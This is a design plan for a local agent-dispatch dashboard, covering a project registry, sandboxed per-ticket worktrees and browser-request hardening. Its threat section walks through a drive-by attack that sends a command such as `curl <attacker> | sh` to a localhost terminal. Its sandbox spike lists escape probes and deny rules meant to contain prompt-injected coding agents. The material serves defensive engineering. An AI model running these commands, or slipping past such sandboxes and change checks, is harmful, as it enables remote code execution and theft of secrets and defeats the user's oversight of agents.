---
status: in-progress
created: 2026-10-13
---

# Task: Multi-Project Dispatch — Project Registry, Verify Harness, Project/Session View

## Goal
Make AgenticOS the single place to dispatch and review work across many local projects, instead of juggling one IDE/terminal window per project. Today every agent launch is hardcoded to the runner's own root or `KNOWLEDGE_BASE_ROOT`, so it cannot run work anywhere else. This plan adds three things:
- a project registry;
- isolated per-ticket worktrees with a per-project verify step, so review items arrive pre-checked;
- a dashboard grouped by project instead of skill, where each project lists its Claude and Codex sessions in a `/resume`-style list.

Registry design: the real `projects.yaml` sits at the repo root and is **gitignored**, because entries name private and client projects and this repo is public. `projects.example.yaml`, which uses fake entries, is committed and documents the schema. The path can be overridden with `AGENTIC_OS_PROJECTS`.

Harness lesson: agents run non-interactive shells, so the interpreter found on PATH can differ from the one the IDE uses. For example, Homebrew R without packages is found instead of conda R, and child processes inherit that. Each entry therefore pins `env.PATH` explicitly.

## Threat Model
Single user, localhost, one Flask process plus occasional CLI calls. Agents are trusted not to be malicious. The safeguards below stop **accidents**: confidential text leaking to Linear, an agent writing to the main checkout, seed data being committed, and concurrent runs clobbering each other. They detect these or fail closed.

Full containment of a hostile agent is a non-goal: no containers and no separate OS user. One exception (Decision 9, added 2026-10-14): `confidential` projects run under the agent CLI's own built-in sandbox, because prompt injection can make a trusted agent act badly. That sandbox limits shell writes and shell network access. It does not limit reads.

## Security Precondition: Browser Request Checks (do first, independent of every phase)
Added 2026-10-14 and widened after Round 5 (MPD-21/22) to cover HTTP as well as Socket.IO. These are pre-existing holes and do not depend on this plan.
- **Hole.** `runner/app.py:149` creates `SocketIO(app, cors_allowed_origins="*")`. Browsers' same-origin policy does not stop a page from opening a WebSocket to another origin; the server has to check the `Origin` header itself, and `"*"` turns that check off.
- **Why binding to `127.0.0.1` (`runner/app.py:3466`) does not help.** The connection comes from the user's own browser, which is on the same machine.
- **Attack path.** It needs no click, only a page load.
  1. The runner is up, which is always under launchd `KeepAlive`.
  2. The user opens any malicious or compromised page, or an ad.
  3. Its JavaScript connects to `ws://127.0.0.1:8510`.
  4. It emits `pty_start` (`runner/modules/pty/__init__.py:131`), then `pty_input` with an arbitrary command, e.g. `curl <attacker> | sh`.
  5. The command runs as the user, with access to `~/.ssh`, API keys and every local repo, including confidential ones.

  Other Socket.IO events, such as `skill_selected`, are exposed the same way.
- **HTTP holes (Round 5).** Flask routes are not covered by the Socket.IO origin list.
  - **Plain cross-site request.** `GET /stream?prompt=…&agent=…` (`runner/app.py:2634`) starts an agent run from query parameters. A plain `<img src>` on any page triggers it. That needs no JavaScript and no preflight, and the browser blocking the response does not stop the dispatch. Multipart `POST /upload`, `/api/board/upload` (`runner/modules/pty/__init__.py:184,215`) and `/api/stt` (`runner/modules/stt/__init__.py:228`) are simple requests too: a page can write files or spend STT quota.
  - **DNS rebinding.** A page on an attacker host that re-resolves to `127.0.0.1` becomes same-origin with the runner. It can then send JSON to `POST /run` (`:2421`, a Claude run in `bypassPermissions` mode) and read every API response. Flask 3.1.3 has `TRUSTED_HOSTS=None` by default, so it checks no Host header.
  - Engine.IO's default `cors_allowed_origins=None` takes the allowed origin from the request's own Host header (`engineio/base_server.py:284`), so just deleting `"*"` would still let a rebinding page in. The explicit list below does not have that problem.
- **Fix.** All allow-lists come from the actual `--host`/`--port` arguments, never from request headers.
  - **Socket.IO.** Pass `cors_allowed_origins` an explicit list: `http://127.0.0.1:<port>` and `http://localhost:<port>`, plus `http://<host>:<port>` when `--host` is something else. Never use `"*"`. `socketio` is created at import time (`:149`), before argument parsing (`:3465`), so either set `socketio.server.eio.cors_allowed_origins` after parsing or create `SocketIO` after parsing, whichever is the smaller diff.
  - **Host.** `app.config["TRUSTED_HOSTS"] = ["127.0.0.1", "localhost", <host>]`. A request with any other Host gets a 400 before any route runs, and that blocks DNS rebinding on every Flask route.
  - **Delete `GET /stream`.** It has no caller: `index.html` has no `EventSource`, and nothing else in the repo or the LaunchAgents refers to it (grep, 2026-10-14). Deleting it removes the no-JavaScript attack.
  - **Per-process request token (Round 6, MPD-35).** This replaces a Fetch-Metadata header guard. Browsers that send neither `Sec-Fetch-Site` nor `Origin` would have got straight past such a guard.
    - At startup the runner creates `secrets.token_urlsafe(32)` and renders it into `index.html`.
    - One `@app.before_request` hook requires the header `X-AgenticOS-Token` to equal the token (`hmac.compare_digest`) on every request except `GET /`, `/favicon.ico`, static files and `GET /api/board/uploads/<f>`. A missing or wrong token gets 403, whatever other headers the request carries.
    - **Why attachment downloads are exempt (Round 7, MPD-38).** Attachments open through plain `<a href>` links (`index.html:3797`), which cannot carry a header. The route is a read-only file serve. The token never goes into a URL. Missing CORS alone does not protect it, because no-cors embedding still works (MPD-40). A foreign page could load an uploaded `.js` with `<script src>` and read the globals it defines. So the response also carries `Cross-Origin-Resource-Policy: same-origin`, which blocks every cross-origin embed. The Host check stops rebinding.
    - **Uploaded files cannot run as the dashboard.** An uploaded HTML or SVG file is served from the dashboard origin, where it could read the token. So `api_board_uploads_serve` (`runner/modules/pty/__init__.py:208`) adds `Content-Security-Policy: sandbox`, `X-Content-Type-Options: nosniff` and `Cross-Origin-Resource-Policy: same-origin`. The file then opens in an opaque origin with scripts disabled.
    - On the client, one `fetch` wrapper adds the header to same-origin requests, and any `XMLHttpRequest` upload sets it too.
    - Socket.IO connects with `io({auth: {token}})`, and the `connect` handler rejects a mismatch. That is a second layer behind the Origin list.
    - A cross-site page cannot read the token: the same-origin policy hides the page from it, and the Host check stops DNS rebinding from loading `/`. A custom header also forces a CORS preflight, which the runner never answers.
    - No CLI client calls the runner over HTTP today (same grep), so no token file is needed. Add one (mode 600) only when such a client appears.
  - **No framing (MPD-36).** An `after_request` hook sets `Content-Security-Policy: frame-ancestors 'none'` on every response. A cross-site page then cannot load the dashboard in an iframe, where it would get the token and auto-open a PTY (`index.html:3519-3522`), or use it for clickjacking. Ordinary links and bookmarks to `GET /` still work.
- **Not a mitigation.** Newer Chrome builds restrict public pages from reaching private addresses (Private Network Access). Enforcement for WebSockets and in other browsers varies, so it cannot be relied on.
- **Verification.** Socket.IO checks use the existing `python-socketio` client or a raw WebSocket handshake. HTTP checks use the Flask test client. Agent launch is stubbed so that no real CLI runs.
  - With `Origin: https://evil.example`, the Socket.IO handshake is refused (HTTP 400/403, or the connection is rejected) and no PTY process is spawned. With `Origin: http://127.0.0.1:<port>`, the handshake connects and `pty_start` works.
  - `Host: evil.example` on `POST /run` with a JSON body gets 400, and nothing is launched.
  - `GET /stream?prompt=x` gets 404 because the route is gone, and no `_running_jobs` entry is created.
  - `POST /run` with valid JSON but no token, or a wrong token, gets 403 and launches nothing. The same request with the token passes.
  - A multipart `POST /upload` without the token gets 403 and writes no file, even with no `Origin` or `Sec-Fetch-*` headers.
  - A Socket.IO connect with an allowed Origin but no token is rejected.
  - `GET /` gets 200 and carries `frame-ancestors 'none'`.
  - An uploaded attachment opens through its link without a token. Its response carries `Content-Security-Policy: sandbox`, `nosniff` and `Cross-Origin-Resource-Policy: same-origin`. Manual browser check: a page on another origin that loads an uploaded `.js` fixture with `<script src>` never sees the fixture's sentinel global. An uploaded `.html` file containing a script that reads `document.body` runs no script in the dashboard origin.
  - Manual check: the dashboard, including its terminal, run streaming, upload and STT, still works at both `http://127.0.0.1:8510` and `http://localhost:8510`.
- Found by code reading on 2026-10-14 (Socket.IO by the host; `/stream`, uploads and rebinding confirmed in Round 5). None of the holes was exploited in a live test.

## Key Decisions (settled with user 2026-10-13)
1. **Run location = per-ticket git worktree, never the main checkout.**
   - Worktree at `~/.agentic-os/worktrees/<key>/<issue-identifier>`, outside every repo, so seeded data never lands under agentic-os. Created with dir mode 700.
   - Branch `agent/<issue-identifier>`, based on the project's `HEAD`. The agent commits on that branch.
   - Accept = the user merges manually. Reject = remove the worktree and branch via `projects.py cleanup <key> <identifier>`.
   - Several worktrees per project may run in parallel, so there is no project lock. A rework of the same ticket reuses its existing worktree and branch. **One launch per ticket at a time**: a per-ticket file lock (`fcntl.flock`, non-blocking, on `~/.agentic-os/worktrees/<key>/<id>.lock`) is held across worktree create/reuse → run → verify → cleanup, by both the dashboard and every `projects.py` subcommand. An overlapping launch, CLI verify or cleanup on the same ticket is rejected; different tickets are independent (today the retry guard at `runner/app.py:2962` is a no-op `pass`).
   - `seed:` lists gitignored paths that tests need, as paths relative to the project root (absolute paths and `..` rejected; resolved source must stay inside the root). They are copied from the main checkout into the worktree at creation with `shutil.copytree(symlinks=False)` / `shutil.copy2`, which dereference links into independent files, so the agent cannot write through to the original data. A missing seed path or a dangling link ⇒ dispatch fails before the agent starts. **Destination checks:**
     - The destination must not exist in the fresh worktree. A collision with a tracked path is rejected.
     - No destination ancestor may be a symlink, which a committed directory symlink could create. This is checked again on worktree reuse.
     - After copying, every seed must be ignored by the worktree's own committed rules (`git -C <wt> check-ignore -q <seed>`). An uncommitted ignore rule in the main checkout does not count.
     - Before a run is marked for review, `git -C <wt> log --name-only <base>..HEAD` must not touch any seed path. If it does, the verify badge shows `seed committed`, the run fails, and the card tells the user to run `projects.py cleanup` rather than merge.
   - A project whose verify target is not committed at `HEAD` cannot be dispatched. The registry loader reports this, and the fix is for the user to commit (AgenticOS never commits to a project's main branch).
   - **Binding is persisted, never re-derived.** The first launch records `{project_key, issue_identifier, worktree, branch, base_sha}` on the run record (additive fields). Retry/rework, verify, archive and restore read the binding from the task's earlier run, not from the current Linear label. Missing binding or missing worktree for a bound task ⇒ fail closed with an error on the card; never fall back to the legacy runner-root launch.
   - **Main-checkout guard.** Non-confidential Claude and deepseek-tui agents run unsandboxed (claude `bypassPermissions`, deepseek-tui `--auto`). Non-confidential Codex runs under a sandbox whose escalations an auto-reviewer may approve. Confidential agents are sandboxed (Decision 9). In every case the main repo's git dir stays writable. In both cases "never touch the main checkout" is therefore detected, not prevented: before and after each run, record a fingerprint of the main checkout: `HEAD` SHA, sha256 of `git diff --cached --binary`, sha256 of `git diff --binary`, and `(path, size, mtime_ns)` for every untracked and ignored file (`git status --porcelain -uall --ignored=matching`, walking listed dirs). Runner bookkeeping paths are excluded: the set is computed at runtime as the files AgenticOS itself writes inside that checkout. Today that is only `RUN_LOG` (default inside the knowledge-base checkout) and its `.lock`, so concurrent runs elsewhere do not trigger false alarms. Any other difference, or a snapshot error, ⇒ the card shows "main checkout changed" and the verify badge is forced to fail. Limit: a write that restores size and mtime of an ignored file goes undetected. That is accepted under the threat model.
   - **Process-tree ownership.** Project agent and verify processes start with `start_new_session=True`. On **every** exit path (success, error, cancel, timeout), `os.killpg` sends the group SIGTERM, then SIGKILL after 5 s. That stops background servers and watchers an agent left behind. The group is reaped before verify, cleanup or lock release. The same rule applies to the verify process group before results are recorded.
2. **Verify runs only in an owned worktree.** `projects.py verify` requires `--worktree` (a baseline check uses `projects.py worktree <key> CHECK` first). `{root}` in `verify` expands to the main-checkout path, for tools that live only there, such as `{root}/.venv/bin/python`; `{base}` expands to the persisted `base_sha`. `env.PATH` is prepended to the inherited PATH and never replaces it. Verify has a timeout (default 600 s, `verify_timeout_s` overrides). The raw verify output tail is kept locally only.
3. **Tracker routing = Linear label `project:<key>`.** The poller already filters on one `project_slug` (`runner/linear_client.py:263`) and already fetches labels, so a label needs no poller change. Unlabelled tickets keep today's behaviour, running at the runner root. Project-bound tickets skip the LLM skill-routing call.
3a. **One dispatch path for all launches of a project ticket.** Today `cwd=ROOT` is hardcoded at `runner/modules/linear/__init__.py:607,638` (auto-dispatch + routing), `runner/app.py:3069` (retry/rework) and `runner/app.py:2449,2551` (`/run`; `/stream` at `:2670` is deleted by the Security Precondition). All project-bound launches go through one helper that resolves the binding → worktree → `cwd` + `env`. Project tickets always launch the agent CLI via `_ai_command` — never `run_skill.py` executable entrypoints (which resolve against the runner root). Allowed backends for project tickets: `claude`, `codex`, `deepseek-tui`; the direct-API `deepseek` backend (`runner/deepseek_agent.py`, process-global env, `workspace=ROOT`) is rejected for project tickets with a clear error. **Superseded once `2026-10-14-dsh-backend-swap.md` lands (planned before Phase 2):** the allowed backends become `claude`, `codex` and `dsh`. Both DeepSeek legacy ids then alias to `dsh`, and the direct-API special case disappears.
   - **Runner-side commit (dsh only, MPD-33).** If the dsh spike shows that a sandboxed dsh run cannot commit in a worktree, the runner commits on `agent/<id>`, still holding the ticket lock. The commit runs in this order:
     1. after the agent's process group is reaped;
     2. `git add -A`, which skips seeds, because seeds must already be ignored by the worktree's committed rules;
     3. the commit;
     4. then the `seed committed` check and verify run, on the result.
   - **Incremental run events (MPD-31).** The launch helper reads the agent's stdout line by line for every backend and launch path, including Linear auto-dispatch, which today waits on `communicate()`. Each structured event becomes one normalized line (assistant text, `[tool] <name> <short arg>` or `[result] ok|error`). Those lines go into a bounded in-memory ring per run (about 256 KB) and are emitted as `run_event`. Completion parsing reads the same lines, and Decision 10 `run` tabs render them.
4. **Confidential redaction is enforced in code, at one gate.** Every automatic tracker comment (run result, error, timeout, retry "Human Feedback" at `runner/app.py:2995`, attachments) goes through one `tracker_comment(binding, kind, **fields)` gate. For `confidential: true` the body is a fixed template from trusted structured fields only: run status, `verify: pass|fail (exit N, D s)`, `git diff --shortstat` counts vs `base_sha`. No prompt echo, agent output, verify output, error text, feedback text, attachment names, file names or diff; an error reads "see local run <run_id>". Human-feedback comments for confidential tickets are not posted at all (feedback stays in the local run record). The current `_linear_comment_body` (`runner/modules/linear/__init__.py:208`) is never called for confidential bindings.
4a. **Local run records for confidential projects stay runner-owned.** `RUN_LOG` defaults to the knowledge-base checkout (`runner/app.py:122`), which is itself a registered (git) project. For confidential bindings `_write_run_log` stores prompt/output/error in `outputs/project_runs/<run_id>.json` under the agentic-os checkout (gitignored `outputs/`) and writes only a redacted record (`"[local]"` placeholders + binding fields) to `RUN_LOG`; one shared `load_run_payload(run_id)` helper rehydrates prompt/output/error from the side file for run detail, retry/rework prompt building (`runner/app.py:2915`) and run history (`api_run_history`), while keeping the lifecycle metadata of the latest log record. A missing side file for a redacted record ⇒ detail shows "local payload missing" and retry is refused.
4b. **Shared-state writes are serialized.** Parallel completions make `_write_run_log`'s unlocked read-modify-write of `task_state.json` / `job_state.json` racy (`runner/app.py:1838-1929`). `run_skill.py` `_update_state` (`runner/run_skill.py:96`) also rewrites `outputs/job_state.json` from another process. Every read-modify-write of `job_state.json` / `task_state.json`, in both `app.py` and `run_skill.py`, holds a cross-process `fcntl.flock` on a sibling `<file>.lock`. Each write goes to a unique temp file in the same dir (`tempfile.mkstemp`) and then `os.replace`. `projects.py` never writes these files.
5. **`no_push: true`** ⇒ the dispatch prompt forbids push/deploy. Enforcement is prompt-only (accepted risk, see Risks).
6. **Dashboard: project sections replace the skill-stack sections.**
   - Remove the skill card grid and its JS: stack grouping (`runner/templates/index.html:1017-1027`, `728-732`) and agent-compat greying.
   - Keep the skill registry build and `_load_registry` for the CLI and `/run`.
   - The knowledge base is registered as a project (`confidential: false`, `no_push: true`, verify `git diff --check {base}` so committed and uncommitted changes since the base are both checked). KB skills are invoked through ticket prompts, e.g. `/llm-wiki-ingest raw/x.md`. A full wiki lint is not used as verify because ~2,333 historical findings would make it fail forever.
7. **Code layout:** all new logic goes in one module, `runner/projects.py`, which holds the loader, verify, worktree create/seed/cleanup and the two session readers. Its CLI is `.venv/bin/python3 runner/projects.py {list|worktree|verify|cleanup} …`. This avoids overloading `run_skill.py`'s skill-name namespace and its lock/retry semantics.
8. **Verify failure has no new state.** The board has no Human Review column and the run-status set is closed (`AGENTS.md`). A project run always ends in the existing `review` status / In Review column; the card carries a verify badge (`pass` / `fail` / `timeout` / `main checkout changed`) from additive run-record fields. Failing runs sort first in the In Review column.
9. **Confidential projects run under the agent CLI's built-in sandbox** (added 2026-10-14; not yet reviewed). Agent shell commands get no network and can write only to the worktree and the paths below. This is a second layer on top of the main-checkout fingerprint, which stays in place.
   - **Scope.** The hard sandbox below applies only to bindings with `confidential: true`. Non-confidential Codex runs get a softer mode (see the next bullet). Non-confidential Claude and deepseek-tui runs keep today's flags. There is no separate `sandbox:` registry field.
   - **Non-confidential Codex project runs use `--approve-for-me`** (added 2026-10-14 by user decision). It is passed without `--sandbox`: the flag already selects the `workspace-write` sandbox with on-request approvals (`codex exec --help`), and the CLI reference lists the two flags as conflicting (MPD-23).
     - The git common dir is passed via `--add-dir`, as for confidential runs.
     - `--approve-for-me` sets `approvals_reviewer="auto_review"`. Requests that go beyond the sandbox, such as a package install, network access or a write outside the worktree, then go to a reviewer model instead of a person.
     - This is an upgrade from today's full bypass, and the user is still never asked.
     - It is not used for confidential projects, for three reasons:
       - OpenAI documents auto-review as "not a deterministic security guarantee", weakest in adversarial contexts, and prompt injection is exactly the threat Decision 9 addresses.
       - The reviewer needs an interactive approval policy such as `on-request`, so it cannot be combined with `approval_policy="never"`.
       - Its behaviour under `codex exec` is undocumented.
     - If spike check (f) fails, non-confidential Codex runs go back to today's bypass flags. That keeps current behaviour, so it is not a regression. Record the fallback in the plan. An argv or usage error is a bug in the command line and gets fixed. Only a real behaviour failure, such as a hang or no commit, triggers the fallback.
   - **Codex (flags verified in `codex-cli 0.162.0 --help`).** Replace `--dangerously-bypass-approvals-and-sandbox` with `--sandbox workspace-write`. Writable roots are the worktree (cwd) and `/tmp`. Add `--add-dir <git common dir>` (`git -C <wt> rev-parse --git-common-dir`), because commits on `agent/<id>` write objects and refs into the main repo's `.git`. Pin `-c 'approval_policy="never"'`. `codex exec` rejects `-a`, so the setting goes through a `-c` config override. With this setting the agent never asks: a blocked action fails and the error goes back to the model. Spike check (a) confirms the override is honoured.
     - **Pin the whole policy, not just argv (MPD-24).** Inherited `~/.codex/config.toml` could turn on `sandbox_workspace_write.network_access` or add `writable_roots`, so the command line also passes `-c sandbox_workspace_write.network_access=false` and `-c 'sandbox_workspace_write.writable_roots=[]'`. The only extra root is the `--add-dir` above.
     - The spike runs once more with a temporary `CODEX_HOME` whose config enables network and adds a writable root. Checks (c) and (d) must still block.
   - **Claude (unverified).** Pass a per-run `--settings <file>` that enables Claude Code's sandbox. Bash writes are limited to the worktree plus the git common dir, Bash network is off, and Bash commands are auto-allowed only when sandboxed. Replace `bypassPermissions` with a mode that auto-accepts edits inside the working directory and refuses them elsewhere, such as `acceptEdits` plus `--add-dir` for the git common dir. Add `permissions.deny` read rules for `**/.env*` and `~/.ssh/**`. The spike settles the exact keys and whether this combination keeps non-interactive `-p` runs from stalling.
     - **Pin the whole policy (MPD-24).** The settings file sets:
       - the sandbox to fail rather than run unsandboxed when it is unavailable (`failIfUnavailable`);
       - unsandboxed retries off (`allowUnsandboxedCommands: false`);
       - no `excludedCommands`.
     - `--setting-sources` is narrowed so that user, project and local settings cannot widen the policy. This matters most for project settings: `.claude/settings.json` lives in the worktree, and the agent can write to it.
     - The spike confirms the exact key names, that authentication still works, and that a permissive `.claude/settings.json` committed in the worktree is ignored.
   - **deepseek-tui and the direct-API `deepseek` backend** are rejected for confidential projects with a clear error. After the dsh swap, **`dsh` is always rejected for confidential projects** (that plan's Decision 3): its Seatbelt profile leaves shell network open (MPD-33).
   - **Fail closed.** If a backend's sandbox flags fail the spike, that backend is rejected for confidential projects. It never falls back to bypass mode.
   - **What this does not cover.**
     - Reads stay broad: Codex `workspace-write` can still read the whole disk, so an agent can still read other repos and secrets. The deny rules above narrow this only for Claude.
     - What the model reads still goes to its provider.
   - **Verify gets the same boundary (MPD-25).** Verify runs code that the agent may have edited, such as a test or an imported module. Run outside the sandbox, a prompt-injected edit would get the runner's full privileges.
     - For confidential bindings, verify runs under macOS `sandbox-exec` with a fixed profile. The profile denies `network*` and denies `file-write*` outside the worktree, the git common dir, `/tmp` and `$TMPDIR`.
     - Spike check (g) proves it: a verify command whose imported module tries an external write and a `curl` fails on both, while a normal test passes.
     - If (g) fails, confidential runs skip automatic verify. The badge reads `verify: manual`, and the user runs `projects.py verify` after reading the diff.
     - Non-confidential verify keeps running unsandboxed, as today.

10. **Terminal tabs: several live terminals in the dashboard, one per session** (added 2026-10-14 at the user's request; not yet reviewed). The terminal is the user's preferred view, because feedback and logs show directly. With several projects running, the user wants one tab per session, the ability to click any of them open, and to hide them without stopping them. Today there is one PTY per browser socket (`runner/modules/pty/__init__.py:131-149`). It always starts at `ROOT`, and on disconnect its fd is dropped but the shell is never killed (`:177-181`), so reloading the page loses the session and leaks the process.
   - **Server-owned terminals, not socket-owned.**
     - A registry `term_id -> {pid, fd, kind, project_key, cwd, created_at, scrollback}` lives in the PTY module.
     - `scrollback` is an in-memory ring buffer of about 256 KB per terminal.
     - Socket events carry `term_id`: `term_list → [{term_id, kind, project_key, run_id, cwd, alive, exit_code}]`, `term_open {kind, project_key|run_id, cols, rows} → term_id`, `term_attach {term_id}`, `term_input`, `term_resize`, `term_close`.
     - **Reload (MPD-29).** Connecting no longer opens a PTY. The client calls `term_list` first, rebuilds a tab for each entry and attaches to it. It opens a new terminal only on a user action. An unknown `term_id` returns an error, and the client drops that tab.
     - **No lost output on attach (MPD-30).** Each terminal has one lock. The reader thread appends to scrollback and emits to the room while holding it. `term_attach` takes the same lock, joins the room, sends the scrollback snapshot, then releases. Output therefore either lands in the snapshot or arrives after it, never in neither. No sequence numbers are needed.
     - A browser disconnect only detaches. The process keeps running and the user can reattach after a reload.
     - **Close (MPD-28).** `term_close` and server shutdown kill every process group in the shell's session, not just the shell's own group, because job control puts foreground and background jobs in separate groups.
       - `pty.fork()` makes the shell a session leader, so its sid equals its pid.
       - **Finding the groups (Round 6, MPD-37).** macOS `pgrep` has no `-s` (it exits 2), and macOS `ps` reports `sess` as 0. So the handler lists `ps -A -o pid=,pgid=`, keeps the pids where `os.getsid(pid)` equals the shell's sid, and deduplicates their pgids. That also finds a group whose leader has already exited.
       - Each group gets SIGHUP, then SIGTERM, then SIGKILL after 5 s. A pid that vanishes during the scan is skipped. If the enumeration itself fails, the close is a failure: the tab stays in `term_list` as `cleanup_failed`, and the error is logged. The handler then calls `waitpid` on the shell and closes the fd.
       - Limit: a process that calls `setsid` itself (a daemon) leaves the session and is not tracked. That is the same as closing a normal terminal.
     - There is a cap of 8 live terminals (`AGENTIC_OS_MAX_TERMINALS`). Opening another fails with a clear message.
   - **Two tab kinds.**
     - **`shell`: an interactive login shell in a project.** It opens in the project's main path by default, or in a bound ticket's worktree when opened from a card. It gets the registry `env.PATH` prepended, as verify does, so `R`, `claude` and `codex` resolve the same way as in the IDE.
       - This is the user's own terminal, like a VS Code terminal, so the "agents never touch the main checkout" rule does not apply to it.
       - It does interact with the main-checkout fingerprint (Decision 1). If a `shell` tab is open on a project's main path while a dispatched run for that project is in flight, the run record notes `interactive_tab_open: true`. A "main checkout changed" badge then reads "main checkout changed (interactive tab open)", so the user can tell their own edits from an agent's.
       - **Bound-worktree tabs own the ticket (MPD-27).** A `shell` or resume tab opened in a bound worktree holds that ticket's lock (Decision 1) for as long as it is open. A dispatch, retry, verify or `projects.py cleanup` on that ticket is then refused with "close terminal <term_id> first". `run` tabs and main-path shells take no lock.
     - **`run`: a read-only live view of a dispatched run.** Dispatched runs stay headless (`claude -p --output-format stream-json`, `codex exec --json`), because verify, the run log and completion detection depend on structured output. The tab renders the run's normalized `run_event` lines from the launch helper's in-memory ring (Decision 3a) in xterm. Today's `run_progress` events cover only some paths, so the tab does not use them. It accepts no input.
       - When the run ends, the tab shows the final status and verify badge and offers **Resume in tab**. That opens a resume tab in the run's worktree for interactive follow-up. A running session is never resumed concurrently.
       - **Resume goes through the same policy builder (MPD-26).** The resume command comes from `_ai_cli(binding, interactive=True)`, not a bare `claude --resume` / `codex resume`. That builder applies the same backend eligibility, sandbox settings, pinned Codex config and `--add-dir` as headless dispatch. When a confidential binding has no verified interactive sandboxed form, or the backend has no interactive resume (`dsh`), the button is not shown. A command the user types in a `shell` tab is the user's own and is not filtered.
   - **Session list integration (Phase 1 view).** Each session row gets **Resume in tab** next to the existing copy-command button. Each project header gets **Open terminal**.
   - **UI.**
     - A tab strip sits above the existing bottom terminal panel. Each tab is labelled `<project key> · shell|run · <short id>`, with a status dot (running, exited, run review/fail).
     - Clicking a tab switches between xterm instances (one `Terminal` object per tab, created lazily and disposed on close).
     - The panel collapse button hides the panel only; nothing is killed. Closing a tab (×) kills its process after a confirm, unless the process has already exited.
     - The panel keeps today's resize handle and its saved height.
   - **Confidential handling (MPD-32).** Tabs add no persistence.
     - Scrollback from `shell` and resume tabs exists only in server memory and the browser. It is never written to `RUN_LOG`, side files, Linear or disk, and it is discarded on close.
     - A `run` tab shows the run's in-memory event ring. The run's own records (the 4a side file and the stream log written by the launch path) are unchanged and remain the only persisted copy.
   - **Security.** The browser request checks ("Security Precondition" above) must be merged before this work starts. More terminals mean more to lose through that hole. Keep the default bind at `127.0.0.1` (`:3466`).
   - The existing skill-handoff PTY features (`skill_selected`, `_record_pending_handoff`) are keyed by `term_id` instead of socket sid.
     - **Handoff logging follows the binding (MPD-34).** The handoff looks up the terminal's `project_key` and writes through the same `_write_run_log` policy as runs.
     - For a confidential project, the typed command goes to the 4a side file, and `RUN_LOG` gets only the redacted record.

## Progress Checklist
**Phase 0 — registry + verify**
- [ ] Security Precondition. Can ship alone, before anything else.
  - Code:
    - the Socket.IO origin allow-list from `--host`/`--port` replaces `cors_allowed_origins="*"`;
    - `TRUSTED_HOSTS`;
    - delete `/stream`;
    - the request token: a `before_request` check, the `fetch`/XHR wrapper and Socket.IO `auth`;
    - `frame-ancestors 'none'`.
  - Tests, from the precondition's Verification list:
    - a cross-origin handshake is refused and spawns no PTY, while a same-origin handshake with the token works;
    - a foreign Host on `/run` gets 400 and launches nothing;
    - `/stream` gets 404;
    - `/run` or an upload without the token gets 403, and nothing is launched or written;
    - a token-less Socket.IO connect is rejected;
    - `GET /` sends `frame-ancestors 'none'`;
    - an attachment link opens without a token and is served with sandbox, nosniff and CORP `same-origin` headers.
  - Manual check: dashboard terminal, streaming, upload and STT at both `127.0.0.1` and `localhost`.
- [x] `projects.example.yaml` (schema) + `.gitignore` entry for `projects.yaml` — done 2026-10-13
- [ ] Extend `projects.example.yaml` schema with `seed:` (list), `verify_timeout_s:`, `{root}` placeholder doc
- [ ] `runner/projects.py` loader: parse registry (`AGENTIC_OS_PROJECTS` override), expand `~`, validate `path` is a git repo and `verify` is set, every `seed` path exists; unknown key ⇒ clear error
- [ ] Worktree helpers: create (base `HEAD`, branch `agent/<id>`, mode 700, seed copy per Decision 1 with containment + link dereference), reuse-if-exists for rework, `cleanup` (remove worktree + branch); refuse when verify target not tracked at `HEAD`
- [ ] `projects.py verify <key> --worktree DIR [--base SHA]`: worktree required; prepended PATH, `{root}`/`{base}` expansion, timeout; return {exit, duration_s, tail (local only)}
- [ ] Tests (`tests/test_projects.py`, tmp git repo fixture, fake project names only): loader validation errors, PATH prepend, `{root}`/`{base}` expansion, seed copy has no symlinks (nested link + file link + `..`/absolute seed rejected), destination symlink ancestor / tracked-path collision ⇒ error, seed not ignored by worktree's committed rules (source-only uncommitted ignore rule) ⇒ error, committed seed path ⇒ `seed committed`, missing seed / dangling link ⇒ error, untracked verify target ⇒ refusal, timeout ⇒ non-zero result, `verify` without `--worktree` ⇒ error
- [ ] Fill local `projects.yaml` (gitignored) for the pilot projects + knowledge base; `projects.py verify <key> --worktree <fresh seeded worktree>` exits 0 for each
- [ ] Sandbox spike (Decision 9). In a throwaway git repo + worktree, run Claude and Codex once each with the confidential flags. Record the exact flags and settings keys here. Each must pass all of these:
  - (a) completes non-interactively without stalling;
  - (b) can edit a file and commit on `agent/<id>`;
  - (c) a write outside the worktree (e.g. `touch ~/sandbox-probe`) fails;
  - (d) a shell network call (e.g. `curl -sI https://example.com`) fails;
  - (e) for Claude, reading `.env` is denied.
  - (c) and (d) also hold when the inherited configuration is permissive:
    - Codex with a temporary `CODEX_HOME` that enables network and adds a writable root;
    - Claude with a permissive `.claude/settings.json` committed in the worktree.

  - (f) a non-confidential Codex run with `--approve-for-me` (no `--sandbox`) meets all three of these:
    - it finishes under `codex exec` without hanging and without waiting on a human;
    - it can commit on `agent/<id>`;
    - its run output shows how an escalation request, such as `curl`, was decided.

    An argv or usage error is fixed, not treated as a failure.
  - (g) verify under the `sandbox-exec` profile (Decision 9):
    - a verify whose imported module attempts a write outside the worktree and a `curl` fails on both;
    - a normal test passes.

  A backend that fails (a)–(e) is marked rejected for confidential projects. If (g) fails, confidential verify becomes `verify: manual`.

**Phase 1 — project/session view (read-only)**
- [ ] Reader, Claude:
  - Candidate dirs = `~/.claude/projects/<slug>*` for the project path and for its worktree root `~/.agentic-os/worktrees/<key>`, where slug = abs path with every non-alphanumeric char → `-`.
  - Keep a session only when its JSONL `cwd` is the project path or under it on a `/` boundary, or under the project's worktree root. Sessions started in a parent directory are not project sessions (matches `claude --resume`, which lists by exact directory).
  - Exclude non-interactive sessions (`entrypoint` starting `sdk-`).
  - Title = last `custom-title`, else last `ai-title` (`aiTitle`), else first real user message.
  - Also report mtime, git branch, message count, `memory/*.md` names.
  - Per-file results are cached with `usage_reader._cached_by_stat`.
- [ ] Reader, Codex: `~/.codex/state_5.sqlite` opened `mode=ro`, `threads` where `archived=0`, `source IN ('cli','vscode')` (excludes `exec` and subagent threads), `cwd` equals the project path or is under it on a `/` boundary (or under its worktree root); fields title/first_user_message, updated_at, tokens_used, git_branch
- [ ] Tests for both readers against fixture JSONL/SQLite (fake paths): cwd-boundary match (`/a/proj` must not match `/a/proj2`), sdk/exec/subagent exclusion, title precedence
- [ ] UI: replace the skill-stack sections with project sections; expanding a project shows the merged Claude + Codex sessions newest-first as `/resume`-style rows, each with a copy-to-clipboard resume command (`cd <session cwd> && claude --resume <id>` / `cd <session cwd> && codex resume <id>`); remove skill-card JS; `/api/projects` endpoint feeds it

**Phase 2 — dispatch**
- [ ] Label `project:<key>` → registry key on first launch.
  - Persist the binding (Decision 1).
